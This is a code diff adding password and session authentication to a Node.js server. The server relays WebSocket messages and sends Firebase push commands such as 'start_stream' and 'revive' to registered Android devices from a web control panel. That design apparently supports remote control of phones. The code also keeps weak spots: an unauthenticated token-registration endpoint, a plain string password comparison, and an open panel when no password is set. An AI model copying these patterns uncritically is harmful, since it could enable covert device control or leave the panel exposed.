@@ -3,17 +3,21 @@ const http = require('http');
 const { WebSocketServer } = require('ws');
 const path = require('path');
 const fs = require('fs');
+const crypto = require('crypto');
 const admin = require('firebase-admin');
 
 const app = express();
 const server = http.createServer(app);
+
+// Trust proxy (Railway runs behind reverse proxy)
+app.set('trust proxy', 1);
 
 const publicPath = path.join(__dirname, 'public');
 if (!fs.existsSync(publicPath)) {
   console.error(`FATAL: Public directory not found at: ${publicPath}`);
   process.exit(1);
 }
-app.use(express.static(publicPath));
+
 app.use(express.json());
 
 app.use((req, res, next) => {
@@ -24,16 +28,6 @@ app.use((req, res, next) => {
 // ─────────────────────────────────────────────────────────────
 // Firebase Admin SDK initialization (FCM HTTP v1 API)
 // ─────────────────────────────────────────────────────────────
-// Requires the environment variable FIREBASE_SERVICE_ACCOUNT_JSON
-// containing the full JSON contents of a Firebase service account
-// private key (Firebase Console → Project settings → Service accounts
-// → Generate new private key).
-//
-// The Admin SDK handles OAuth2 token generation automatically and
-// targets the modern /v1/ endpoint instead of the deprecated legacy
-// /fcm/send endpoint.
-// ─────────────────────────────────────────────────────────────
-
 let firebaseReady = false;
 
 try {
@@ -53,14 +47,6 @@ try {
   firebaseReady = false;
 }
 
-/**
- * Send a high-priority data-only FCM message to a single device token
- * using the modern HTTP v1 API.
- *
- * @param {string} token    FCM registration token of the target device
- * @param {string} command  Command string (e.g. "revive", "start_stream")
- * @returns {Promise<{success: boolean, error?: string, code?: string}>}
- */
 async function sendFcmMessage(token, command) {
   if (!firebaseReady) {
     return { success: false, error: 'Firebase Admin SDK not initialized', code: 'FIREBASE_NOT_READY' };
@@ -69,9 +55,7 @@ async function sendFcmMessage(token, command) {
   const message = {
     token: token,
     data: { command: command },
-    android: {
-      priority: 'high'
-    }
+    android: { priority: 'high' }
   };
 
   try {
@@ -80,7 +64,6 @@ async function sendFcmMessage(token, command) {
     return { success: true };
   } catch (error) {
     const code = error.code || 'unknown';
-    // Detect stale tokens so the caller can clean them up
     const stale =
       code === 'messaging/registration-token-not-registered' ||
       code === 'messaging/invalid-registration-token' ||
@@ -92,18 +75,170 @@ async function sendFcmMessage(token, command) {
 }
 
 // ─────────────────────────────────────────────────────────────
-// In-memory stores
+// Authentication System
+// ─────────────────────────────────────────────────────────────
+// The password is read from the WEB_PASSWORD environment variable
+// on Railway. If not set, authentication is DISABLED (open panel).
 // ─────────────────────────────────────────────────────────────
 
-const fcmTokens = new Map();          // deviceId -> fcmToken
-const wsIdToDeviceId = new Map();     // wsId -> Android deviceId (for FCM)
-const androidDeviceInfo = new Map();  // wsId -> { model, name, deviceId, connectedAt }
+const WEB_PASSWORD = process.env.WEB_PASSWORD || null;
+const SESSION_TTL_MS = 7 * 24 * 60 * 60 * 1000; // 7 days
+const COOKIE_NAME = 'cloud_sync_auth';
+
+// In-memory session store: token → { createdAt }
+const activeSessions = new Map();
+
+if (WEB_PASSWORD) {
+  console.log('[AUTH] Password protection is ENABLED.');
+} else {
+  console.warn('[AUTH] WEB_PASSWORD not set — panel is OPEN to everyone!');
+}
+
+function generateSessionToken() {
+  return crypto.randomBytes(32).toString('hex');
+}
+
+function parseCookies(cookieHeader) {
+  const cookies = {};
+  if (!cookieHeader) return cookies;
+  cookieHeader.split(';').forEach(c => {
+    const idx = c.indexOf('=');
+    if (idx > 0) {
+      const k = c.substring(0, idx).trim();
+      const v = c.substring(idx + 1).trim();
+      cookies[k] = decodeURIComponent(v);
+    }
+  });
+  return cookies;
+}
+
+function isValidToken(token) {
+  if (!token) return false;
+  const session = activeSessions.get(token);
+  if (!session) return false;
+  if (Date.now() - session.createdAt > SESSION_TTL_MS) {
+    activeSessions.delete(token);
+    return false;
+  }
+  return true;
+}
+
+function isAuthenticated(req) {
+  if (!WEB_PASSWORD) return true; // Auth disabled
+  const cookies = parseCookies(req.headers.cookie);
+  return isValidToken(cookies[COOKIE_NAME]);
+}
+
+// ─────────────────────────────────────────────────────────────
+// Login / Logout routes (PUBLIC — no auth required)
+// ─────────────────────────────────────────────────────────────
+
+app.get('/login', (req, res) => {
+  // Already authenticated → redirect to panel
+  if (isAuthenticated(req)) return res.redirect('/');
+  res.send(LOGIN_PAGE_HTML);
+});
+
+app.post('/login', (req, res) => {
+  const { password } = req.body || {};
+
+  if (!WEB_PASSWORD) {
+    return res.status(500).json({
+      success: false,
+      error: 'No password configured on server.'
+    });
+  }
+
+  if (!password || password !== WEB_PASSWORD) {
+    console.warn(`[AUTH] Failed login attempt from ${req.ip}`);
+    return res.status(401).json({
+      success: false,
+      error: 'كلمة المرور غير صحيحة'
+    });
+  }
+
+  const token = generateSessionToken();
+  activeSessions.set(token, { createdAt: Date.now() });
+
+  const isHttps = req.secure || req.headers['x-forwarded-proto'] === 'https';
+
+  res.cookie(COOKIE_NAME, token, {
+    httpOnly: true,
+    sameSite: 'lax',
+    secure: isHttps,
+    maxAge: SESSION_TTL_MS,
+    path: '/'
+  });
+
+  console.log(`[AUTH] Login success from ${req.ip}`);
+  res.json({ success: true });
+});
+
+app.get('/logout', (req, res) => {
+  const cookies = parseCookies(req.headers.cookie);
+  const token = cookies[COOKIE_NAME];
+  if (token) {
+    activeSessions.delete(token);
+    console.log('[AUTH] Session destroyed');
+  }
+  res.clearCookie(COOKIE_NAME, { path: '/' });
+  res.redirect('/login');
+});
+
+app.get('/api/auth-status', (req, res) => {
+  res.json({
+    authEnabled: !!WEB_PASSWORD,
+    authenticated: isAuthenticated(req)
+  });
+});
+
+// ─────────────────────────────────────────────────────────────
+// AUTH MIDDLEWARE — protects everything below
+// ─────────────────────────────────────────────────────────────
+
+// Paths that never require authentication:
+const PUBLIC_PATHS = new Set([
+  '/login',
+  '/logout',
+  '/api/auth-status',
+  '/api/fcm-token'      // Android registers token here (trusted device)
+]);
+
+app.use((req, res, next) => {
+  // If no password is set, everything is open (backwards compatible)
+  if (!WEB_PASSWORD) return next();
+
+  // Whitelisted paths
+  if (PUBLIC_PATHS.has(req.path)) return next();
+
+  // Authenticated → proceed
+  if (isAuthenticated(req)) return next();
+
+  // Not authenticated
+  if (req.path.startsWith('/api/')) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+
+  // HTML pages → redirect to login
+  return res.redirect('/login');
+});
+
+// ─────────────────────────────────────────────────────────────
+// Static files (now protected by middleware above)
+// ─────────────────────────────────────────────────────────────
+app.use(express.static(publicPath));
+
+// ─────────────────────────────────────────────────────────────
+// In-memory stores
+// ─────────────────────────────────────────────────────────────
+const fcmTokens = new Map();
+const wsIdToDeviceId = new Map();
+const androidDeviceInfo = new Map();
 
 // ─────────────────────────────────────────────────────────────
 // FCM endpoints
 // ─────────────────────────────────────────────────────────────
 
-// Register/update FCM token from Android app
 app.post('/api/fcm-token', (req, res) => {
   const { token, deviceId } = req.body;
   if (!token || !deviceId) {
@@ -114,7 +249,6 @@ app.post('/api/fcm-token', (req, res) => {
   res.json({ success: true, totalDevices: fcmTokens.size });
 });
 
-// Send FCM to ONE specific device (by deviceId or by currently-connected wsId)
 app.post('/api/fcm/send', async (req, res) => {
   let { deviceId, wsId, command } = req.body;
 
@@ -147,11 +281,6 @@ app.post('/api/fcm/send', async (req, res) => {
   }
 });
 
-// ─────────────────────────────────────────────────────────────
-// Broadcast FCM to ALL known devices (online + offline)
-// Uses the persistent fcmTokens map, so it works even with
-// zero devices currently connected.
-// ─────────────────────────────────────────────────────────────
 app.post('/api/fcm/send-to-all', async (req, res) => {
   const { command } = req.body;
 
@@ -205,7 +334,6 @@ app.post('/api/fcm/send-to-all', async (req, res) => {
   res.json({ success: true, sent, failed, results });
 });
 
-// List ALL known devices (connected + offline with stored token)
 app.get('/api/devices/known', (req, res) => {
   const known = [];
 
@@ -235,10 +363,6 @@ app.get('/api/devices/known', (req, res) => {
   });
 });
 
-// ─────────────────────────────────────────────────────────────
-// Devices REST API (currently-connected only)
-// ─────────────────────────────────────────────────────────────
-
 app.get('/api/devices', (req, res) => {
   const devices = [];
   androidClients.forEach((ws, wsId) => {
@@ -259,13 +383,11 @@ app.get('/api/devices', (req, res) => {
 // SPA fallback
 // ─────────────────────────────────────────────────────────────
 
-app.get(/^(?!\/api).*/, (req, res) => {
+app.get(/^(?!\/api|\/login|\/logout).*/, (req, res) => {
   const indexPath = path.join(publicPath, 'index.html');
   if (fs.existsSync(indexPath)) {
-    console.log(`Serving index.html for ${req.url}`);
     res.sendFile(indexPath);
   } else {
-    console.error(`FATAL: index.html not found at: ${indexPath}`);
     res.status(404).send('index.html not found');
   }
 });
@@ -334,7 +456,12 @@ wss.on('connection', (ws, req) => {
   ws.clientId = clientId;
   ws.clientType = null;
 
-  console.log(`Client connected: ${clientId} from ${req.socket.remoteAddress}`);
+  // Check authentication from the upgrade request cookies
+  const cookies = parseCookies(req.headers.cookie);
+  const authToken = cookies[COOKIE_NAME];
+  ws.isAuthenticated = isValidToken(authToken) || !WEB_PASSWORD;
+
+  console.log(`Client connected: ${clientId} (auth: ${ws.isAuthenticated})`);
 
   sendTo(ws, { type: 'id', id: clientId });
 
@@ -343,22 +470,24 @@ wss.on('connection', (ws, req) => {
     try {
       msg = JSON.parse(raw.toString());
     } catch (e) {
-      console.warn(`Invalid JSON from ${clientId}: ${raw.toString().substring(0, 100)}`);
+      console.warn(`Invalid JSON from ${clientId}`);
       return;
     }
 
     const { type, ...payload } = msg;
 
-    if (!type) {
-      console.warn(`Message without type from ${clientId}`);
-      return;
-    }
+    if (!type) return;
 
-    // ── Identification handshake ────────────────────────────
+    // ── Identification handshake ──
     if (type === 'identify') {
       const clientType = payload.clientType || payload.data;
-      if (clientType !== 'web' && clientType !== 'android') {
-        console.warn(`Invalid clientType from ${clientId}: ${clientType}`);
+      if (clientType !== 'web' && clientType !== 'android') return;
+
+      // Web clients MUST be authenticated (if password is set)
+      if (clientType === 'web' && !ws.isAuthenticated) {
+        console.warn(`[AUTH] Unauthorized web client ${clientId} — closing`);
+        sendTo(ws, { type: 'error', message: 'Unauthorized', code: 'UNAUTHORIZED' });
+        try { ws.close(4001, 'Unauthorized'); } catch (e) {}
         return;
       }
 
@@ -377,7 +506,6 @@ wss.on('connection', (ws, req) => {
         const deviceId = payload.deviceId || null;
         if (deviceId) {
           wsIdToDeviceId.set(clientId, deviceId);
-          console.log(`Mapped ${clientId} -> deviceId ${deviceId}`);
         }
 
         const info = {
@@ -389,8 +517,6 @@ wss.on('connection', (ws, req) => {
         };
         androidDeviceInfo.set(clientId, info);
 
-        console.log(`Android device info [${clientId}]: name="${info.name}", model="${info.model}"`);
-
         webClients.forEach((webWs, webId) => {
           sendTo(ws, { type: 'web-client-ready', id: webId });
           sendTo(webWs, buildAndroidReadyPayload(clientId));
@@ -401,8 +527,9 @@ wss.on('connection', (ws, req) => {
       return;
     }
 
-    // ── Web client re-announces itself ──────────────────────
+    // ── Web client re-announces itself ──
     if (type === 'web-client-ready') {
+      if (!ws.isAuthenticated) return;
       if (!webClients.has(clientId)) {
         webClients.set(clientId, ws);
         ws.clientType = 'web';
@@ -413,7 +540,7 @@ wss.on('connection', (ws, req) => {
       return;
     }
 
-    // ── Relay events between clients ────────────────────────
+    // ── Relay events ──
     if (relayEvents.includes(type)) {
       const targetId = payload.to;
       const forwardMsg = { type, ...payload, from: clientId };
@@ -422,9 +549,7 @@ wss.on('connection', (ws, req) => {
         const targetWs = findClient(targetId);
         if (targetWs) {
           sendTo(targetWs, forwardMsg);
-          console.log(`Relayed ${type} from ${clientId} to ${targetId}`);
         } else {
-          console.warn(`Recipient ${targetId} not found for ${type}`);
           sendTo(ws, {
             type: 'error',
             message: `Recipient ${targetId} not found`,
@@ -434,22 +559,16 @@ wss.on('connection', (ws, req) => {
       } else {
         if (webClients.has(clientId)) {
           broadcastToAndroid(forwardMsg);
-          console.log(`Broadcast ${type} to all Android clients`);
         } else if (androidClients.has(clientId)) {
           broadcastToWeb(forwardMsg);
-          console.log(`Broadcast ${type} to all Web clients`);
-        } else {
-          console.warn(`Could not route ${type} from unidentified client ${clientId}`);
         }
       }
       return;
     }
-
-    console.warn(`Unknown message type from ${clientId}: ${type}`);
   });
 
   ws.on('close', () => {
-    console.log(`Client disconnected: ${clientId} (type: ${ws.clientType})`);
+    console.log(`Client disconnected: ${clientId}`);
     const wasWeb = webClients.delete(clientId);
     const wasAndroid = androidClients.delete(clientId);
 
@@ -461,7 +580,6 @@ wss.on('connection', (ws, req) => {
       androidDeviceInfo.delete(clientId);
       broadcastToWeb({ type: 'android-client-disconnected', id: clientId });
     }
-    console.log(`Clients - Web: ${webClients.size}, Android: ${androidClients.size}`);
   });
 
   ws.on('error', (error) => {
@@ -473,10 +591,199 @@ server.on('error', (error) => {
   console.error('Server error:', error);
 });
 
+// ─────────────────────────────────────────────────────────────
+// Periodic cleanup of expired sessions
+// ─────────────────────────────────────────────────────────────
+setInterval(() => {
+  const now = Date.now();
+  let cleaned = 0;
+  for (const [token, session] of activeSessions.entries()) {
+    if (now - session.createdAt > SESSION_TTL_MS) {
+      activeSessions.delete(token);
+      cleaned++;
+    }
+  }
+  if (cleaned > 0) console.log(`[AUTH] Cleaned ${cleaned} expired session(s)`);
+}, 60 * 60 * 1000); // Every hour
+
+// ─────────────────────────────────────────────────────────────
+// Login page HTML (embedded)
+// ─────────────────────────────────────────────────────────────
+const LOGIN_PAGE_HTML = `<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>تسجيل الدخول</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:'Plus Jakarta Sans',system-ui,sans-serif;
+  background:#08090f;
+  background-image:
+    radial-gradient(at 0% 0%, rgba(13,20,41,.9) 0, transparent 50%),
+    radial-gradient(at 100% 100%, rgba(6,30,40,.7) 0, transparent 50%);
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#f3f4f6;
+  padding:20px;
+}
+.card{
+  background:rgba(22,26,46,.7);
+  backdrop-filter:blur(16px);
+  border:1px solid rgba(255,255,255,.05);
+  border-radius:20px;
+  padding:36px 28px;
+  width:100%;
+  max-width:400px;
+  text-align:center;
+  box-shadow:0 8px 32px rgba(0,0,0,.4);
+}
+.orb{
+  width:64px;height:64px;
+  margin:0 auto 16px;
+  background:linear-gradient(135deg,#00f0ff 0%,#3b82f6 100%);
+  border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:28px;
+  box-shadow:0 0 30px rgba(0,240,255,.4);
+}
+h1{font-size:20px;font-weight:800;margin-bottom:6px;color:#fff}
+p{font-size:13px;color:#9ca3af;margin-bottom:24px}
+input{
+  width:100%;
+  padding:14px 18px;
+  background:rgba(0,0,0,.3);
+  border:1px solid rgba(255,255,255,.08);
+  border-radius:12px;
+  color:#00f0ff;
+  font-family:inherit;
+  font-size:15px;
+  outline:none;
+  text-align:center;
+  letter-spacing:2px;
+  transition:all .3s;
+}
+input:focus{
+  border-color:rgba(0,240,255,.5);
+  box-shadow:0 0 15px rgba(0,240,255,.15);
+}
+button{
+  width:100%;
+  margin-top:16px;
+  padding:14px;
+  border:none;
+  border-radius:12px;
+  background:linear-gradient(135deg,#00f0ff 0%,#3b82f6 100%);
+  color:#05050a;
+  font-family:inherit;
+  font-size:15px;
+  font-weight:700;
+  cursor:pointer;
+  transition:all .3s;
+  box-shadow:0 0 20px rgba(0,240,255,.25);
+}
+button:hover:not(:disabled){
+  transform:translateY(-2px);
+  box-shadow:0 0 30px rgba(0,240,255,.5);
+}
+button:disabled{opacity:.5;cursor:not-allowed}
+.error{
+  margin-top:14px;
+  padding:10px;
+  border-radius:10px;
+  background:rgba(239,68,68,.1);
+  border:1px solid rgba(239,68,68,.3);
+  color:#ef4444;
+  font-size:13px;
+  display:none;
+}
+.error.show{display:block}
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="orb">🔐</div>
+    <h1>لوحة التحكم</h1>
+    <p>أدخل كلمة المرور للمتابعة</p>
+
+    <input
+      type="password"
+      id="password"
+      placeholder="••••••••"
+      autocomplete="current-password"
+      autofocus>
+
+    <button id="btnLogin" type="button">دخول</button>
+
+    <div class="error" id="error"></div>
+  </div>
+
+<script>
+const input = document.getElementById('password');
+const btn = document.getElementById('btnLogin');
+const err = document.getElementById('error');
+
+async function login() {
+  const password = input.value.trim();
+  if (!password) {
+    showError('أدخل كلمة المرور');
+    return;
+  }
+
+  btn.disabled = true;
+  btn.textContent = 'جارٍ التحقق...';
+  err.classList.remove('show');
+
+  try {
+    const r = await fetch('/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ password })
+    });
+
+    const data = await r.json();
+
+    if (data.success) {
+      btn.textContent = '✓ تم الدخول';
+      setTimeout(() => { window.location.href = '/'; }, 400);
+    } else {
+      showError(data.error || 'فشل التحقق');
+      btn.disabled = false;
+      btn.textContent = 'دخول';
+      input.value = '';
+      input.focus();
+    }
+  } catch (e) {
+    showError('خطأ في الاتصال');
+    btn.disabled = false;
+    btn.textContent = 'دخول';
+  }
+}
+
+function showError(msg) {
+  err.textContent = msg;
+  err.classList.add('show');
+}
+
+btn.addEventListener('click', login);
+input.addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
+</script>
+</body>
+</html>`;
+
+// ─────────────────────────────────────────────────────────────
+// Start server
+// ─────────────────────────────────────────────────────────────
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running at http://0.0.0.0:${PORT}`);
   console.log(`[FCM] Firebase Admin SDK: ${firebaseReady ? 'READY' : 'NOT READY'}`);
+  console.log(`[AUTH] Password protection: ${WEB_PASSWORD ? 'ENABLED' : 'DISABLED'}`);
 });
 
 process.on('SIGINT', () => {
